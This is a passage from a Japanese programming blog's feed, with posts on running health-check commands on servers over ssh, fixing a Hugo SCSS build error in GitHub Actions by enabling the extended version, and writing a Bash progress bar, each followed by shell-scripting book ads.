&lt;h2 id="イメージ">イメージ&lt;/h2>
&lt;p>従来の方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">ローカルＰＣのターミナル
↓ Linuxサーバーにログイン
&lt;span class="nv">$df&lt;/span> &lt;span class="nv">$uptime&lt;/span> などを実行
↓ Linuxサーバーをログアウト
ローカルＰＣにもどる
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これからつくるBash/ssh&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">ローカルＰＣのターミナル
↓
Linuxサーバーにログイン
&lt;span class="nv">$df&lt;/span> &lt;span class="nv">$uptime&lt;/span> などを実行
Linuxサーバーをログアウト
↓
ローカルＰＣのターミナルにもどる
&lt;/code>&lt;/pre>&lt;/div>&lt;p>わかりにくいですか？&lt;br>
まず、メリットとしてサーバーでコマンドからログアウトする必要がありません。&lt;br>
これができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを&lt;br>
順番に訪ね歩きファイルに出力する事も可能です。&lt;/p>
&lt;p>以下、ソースです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/usr/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1">##############################################&lt;/span>
&lt;span class="c1"># sshでサーバーにログインして、なんらかのコマンドを&lt;/span>
&lt;span class="c1"># 実行しターミナルに表示、ミッション終了後、ターミ&lt;/span>
&lt;span class="c1"># ナルを自動的にログアウトしてローカルに何事もなか&lt;/span>
&lt;span class="c1"># ったかのようにもどってくる最も簡単シェルスクリプト&lt;/span>
&lt;span class="c1">##############################################&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># サーバーのＩＰアドレスとか&lt;/span>
&lt;span class="nv">SERVER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;centos@xx.xx.xx.xxx&amp;#34;&lt;/span>
&lt;span class="c1"># 実行したいコマンドを &amp;amp;&amp;amp; でつなぐ&lt;/span>
&lt;span class="nv">COMMAND&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;uptime &amp;amp;&amp;amp; df -h&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;centosサーバーログイン&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1"># ポイントは -t です。&lt;/span>
ssh &lt;span class="nv">$SERVER&lt;/span> -t &lt;span class="nv">$COMMAND&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;centosサーバーログアウト&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
exit&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>たったこれだけですが、この工夫により多くのサーバーを&lt;br>
スクリプトで一括回遊することができます。 お試しあれ。&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>SCSS/CSSを含んだファイルがGitHubActionsでビルドできない</title><link>https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/</link><pubDate>Fri, 24 Dec 2021 09:43:41 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/af7ef3c0-44c1-4f2f-aad8-1a0664724558.jpg" alt="Featured image of post SCSS/CSSを含んだファイルがGitHubActionsでビルドできない" />&lt;p>scssやsassを使ってcssを記述すると、CSSを構造化できてサイトのメンテナンス性が格段に上がります。&lt;br>
GitHub Pagesで公開しているHugoを使ったサイトscss、sassには対応することが可能なので、sassを導入することはメリットがあります。&lt;/p>
&lt;p>ところが、Hugoでscssやsassを含んだファイルをGitHubに公開して、Git Actionで自動ビルドしようとした際に見慣れないエラーが表示されました。&lt;/p>
&lt;pre tabindex="0">&lt;code>Run hugo --minify
Error: Error building site: TOCSS:
failed to transform &amp;quot;scss/style.scss&amp;quot; (text/x-scss).
Check your Hugo installation;
you need the extended version to build SCSS/SASS.
: this feature is not available in your current Hugo version,
see https://goo.gl/YMrWcn for more information
...
Total in 148 ms
Error: Process completed with exit code 255.
&lt;/code>&lt;/pre>&lt;p>なにか悪いことでもしたのでしょうか。&lt;br>
それとも変な記述をしてしまったのだろうかとか思うところです。&lt;/p>
&lt;h2 id="エラーの内容">エラーの内容&lt;/h2>
&lt;p>こういうときは、落ち着いてエラーを見てみましょう。&lt;br>
大抵のことはちゃんと教えてくれているはずです。&lt;/p>
&lt;p>今回のエラーは下記のような内容になります。&lt;/p>
&lt;pre tabindex="0">&lt;code>Check your Hugo installation; you need the extended version
&lt;/code>&lt;/pre>&lt;p>「Hugoのインストールを確認してください。extendedバージョンが必要です。」と記述されていおります。&lt;br>
それではこのエラーに表示されている&lt;code>extended&lt;/code>とは一体何なのでしょうか。&lt;/p>
&lt;h2 id="エラーの対応">エラーの対応&lt;/h2>
&lt;p>さらに落ち着いて設定ファイルを確認していくことにしましょう。&lt;br>
読み進めていくとどうやらworkflowの設定ファイルにヒントがありそうです。&lt;br>
.github/workflow/gh-pages.yml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Setup&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">peaceiris/actions-hugo@v2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">hugo-version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;0.87.0&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c">#extended: true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>.github/workflow/の設定ファイル確認したところ、原因がわかりました。&lt;br>
設定の&lt;code>extended&lt;/code>が思いっきりコメントアウトされていることが原因でした。&lt;/p>
&lt;p>通常のHugoではscss/cssを使用することができません。そうした場合に、Hugo ExtendedをインストールしてHugo自体の機能を拡張してscss/cssを使えるようにするのですが、今回はscssを使っていたにもかかわらず、Hugo Extendedをインストールしていないため発生していたエラーでした。&lt;/p>
&lt;p>コメントを外して、再度Gitにpushしたところ、正常にビルドされて公開できました。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>scssやsassを含んだファイルをhugoをgitに公開しようとした際に、ビルドできない場合は設定を確認することをオススメします。&lt;br>
とくに、scssを使用する際は&lt;strong>Hugo Extended&lt;/strong>のインストールが必要と&lt;a class="link" href="https://gohugo.io/getting-started/installing/" target="_blank" rel="noopener"
>公式&lt;/a>にも書いているので、忘れずに設定しましょう。&lt;/p></description></item><item><title>【プログレスバー】Bashでプログレスバーを作ってみようって話</title><link>https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/</link><pubDate>Thu, 23 Dec 2021 16:10:20 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash.jpg" alt="Featured image of post 【プログレスバー】Bashでプログレスバーを作ってみようって話" />&lt;h2 id="プログレスバー">プログレスバー&lt;/h2>
&lt;p>ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。&lt;br>
処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。&lt;br>
シェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい&lt;/p>
&lt;h2 id="使い方">使い方&lt;/h2>
&lt;p>処理のループ中に以下の1行を追記します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">progress &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$#&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$MAX&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">set&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> count &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="実行手順">実行手順&lt;/h2>
&lt;p>以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ :&amp;gt; Progress.sh
$ vim Progress.sh
&lt;span class="c1"># vimで以下のソースコードを貼り付けて保存&lt;/span>
&lt;span class="c1"># ソースコードのファイルエンコードをUTF-8に変更します。&lt;/span>
$ nkf -wLu Progress.sh &amp;gt; Progress.sh.utf8
&lt;span class="c1"># ファイルエンコードを変更したファイルを元のファイル名にリネームします。&lt;/span>
$ mv Progress.sh.utf8 Progress.sh
&lt;span class="c1"># 実行権限を付与します&lt;/span>
$ chmod +x Progress.sh
&lt;span class="c1"># 実行&lt;/span>
$ ./Progress.sh
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ソースコード">ソースコード&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#! /bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1">#######################################&lt;/span>
&lt;span class="c1"># 進捗を表示するプログレスバー&lt;/span>
&lt;span class="c1"># &lt;/span>
&lt;span class="c1">#######################################&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># percent $1 &lt;/span>
&lt;span class="c1"># GT $2&lt;/span>
progress&lt;span class="o">(){&lt;/span>
&lt;span class="nv">percent&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">GT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">column&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>expr &lt;span class="m">71&lt;/span> &lt;span class="se">\*&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$percent&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> / &lt;span class="nv">$GT&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">nspace&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>expr &lt;span class="m">71&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$column&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入&lt;/span>
&lt;span class="nv">bar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;\r[&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#位置パラメータの数($#)を１にリセット（カウンタとして流用）&lt;/span>
&lt;span class="nb">set&lt;/span> dummy &lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$#&lt;/span> -le &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$column&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nv">bar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$bar&lt;/span>&lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1"># barに=を追加&lt;/span>
&lt;span class="nb">set&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> dummy&lt;span class="p">;&lt;/span> &lt;span class="c1"># $#をインクリメント&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nv">bar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$bar&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">#barの先端に&amp;gt;を追加&lt;/span>
&lt;span class="c1">#位置パラメータの数($#)を１にリセット（カウンタとして流用）&lt;/span>
&lt;span class="nb">set&lt;/span> dummy &lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$#&lt;/span> -le &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$nspace&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nv">bar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$bar&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">set&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> dummy&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nv">bar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$bar&lt;/span>&lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="nv">$percent&lt;/span>/&lt;span class="nv">$GT&lt;/span>&lt;span class="s1">&amp;#39;\c&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1"># barに]と１行分のプログレスバーを表示&lt;/span>
&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$bar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#######################################&lt;/span>
&lt;span class="c1"># メイン処理&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="nb">set&lt;/span> count &lt;span class="p">;&lt;/span>
&lt;span class="nv">MAX&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">100&lt;/span> &lt;span class="p">;&lt;/span> &lt;span class="c1">#最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="o">((&lt;/span> &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span> i&amp;lt;&lt;span class="nv">$MAX&lt;/span>&lt;span class="p">;&lt;/span> i++&lt;span class="o">)){&lt;/span>
&lt;span class="c1"># ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。&lt;/span>
progress &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$#&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$MAX&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">set&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> count &lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1">#終了&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="使い方-1">使い方&lt;/h2>
&lt;p>シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。&lt;/p>
&lt;p>自作ソースの中のループ処理の関数の頭に以下を追記します。&lt;br>
MAX=100; は、処理の最大値を指定します。&lt;br>
処理のループ最大数が150回であれば、以下の通りに修正します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="nb">set&lt;/span> count&lt;span class="p">;&lt;/span>
&lt;span class="nv">MAX&lt;/span>&lt;span class="o">=&lt;/span>150&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>forやwhileループ処理の中に以下を埋め込みます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">progress &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$#&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$MAX&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">set&lt;/span> - &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> count &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最後にforまたはwhileループを抜けた後に&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>を追加します。これだけです。&lt;/p>
&lt;h2 id="実行結果">実行結果&lt;/h2>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 160;
flex-basis: 384px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/progress.gif" data-size="640x400">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/progress.gif"
width="640"
height="400"
loading="lazy"
alt="【プログレスバー】Bashでプログレスバーを作ってみようって話の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
